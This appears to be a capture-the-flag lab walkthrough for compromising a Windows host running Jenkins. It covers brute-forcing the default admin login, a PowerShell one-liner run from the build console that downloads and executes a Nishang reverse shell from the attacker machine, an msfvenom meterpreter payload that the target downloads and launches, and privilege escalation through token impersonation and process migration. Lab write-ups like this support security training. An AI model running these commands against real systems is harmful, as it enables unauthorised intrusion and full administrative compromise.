*Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.*    

# Recon

- `nmap 10.10.253.211` -> `nmap -sC -sV 10.10.253.211 -p 80,3389,8080`
- Navigate to webpage on 80, nothing to interact with here
- Nav to webpage on 8080 for the Jenkins service portal, find a login page
- Google "default Jenkins accounts" and see an 'admin' account is created by default
- XXX - Attempt to do parallelized login attempts via Hydra, couldn't get it to work because there is no "failed" response body"
- Use Burpsuite intruder to send password attempts of intercepted HTTP request, use something smaller than 'rockyou' since its a default account that probably has an easy password
- Login is found to be `admin:admin`
- We immediately greeted with an update notification, potential vector there for an existing Jenkins exploit
- The exercise directs us to look for code exec: we find a build console that allows us to send a project CLI build through the "Configure"
- Google for a cmd or powershell script that can provide us with a reverse shell 
- Using Nishang ([https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)) we download code for a powershell reverse shell.
- Host the code via python server `python3 -m http.server 8000`
- Start up a netcat listener to receive the connection
- On build console, grab hosted script and run the 'Invoke-PowerShellTcp' function to start a reverse shell
	- `powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.113.241/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.113.241 -Port 8010`
- We now receive a basic shell
- msfvenom out for a meterpreter shell payload to upload to the target
	- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=1.1.1.1 LPORT=8010 -f exe > shell.exe`
- host it on a local python server
- From target, download the file
- `powershell "(New-Object System.Net.WebClient).Downloadfile('[http://10.10.144.45:8000/meter.exe](http://10.10.144.45:8000/meter.exe)','meter.exe')`
- don't typo the IP in your command...
- set up msfconsole exploit/multi/handler on local with `set PAYLOAD` to match msfvenom payload and catch the meterpreter shell
- `powershell Start-Process "meter.exe"
- Receive a shell on msfconsole 
- `whoami /priv`
- Abuse SeImpersonatePrivilege to use `load incognito`
- `list_tokens -g` and see that `BUILTIN\Administrators` token is available
- `impersonate_token "BUILTIN\Administrators"
- `getuid` reflects successful token grab
- Abuse SeDebugPrivilege to access program memory injection for migrations
- `ps` and `migrate PID` to a privileged service like `services.exe` to get big boy perms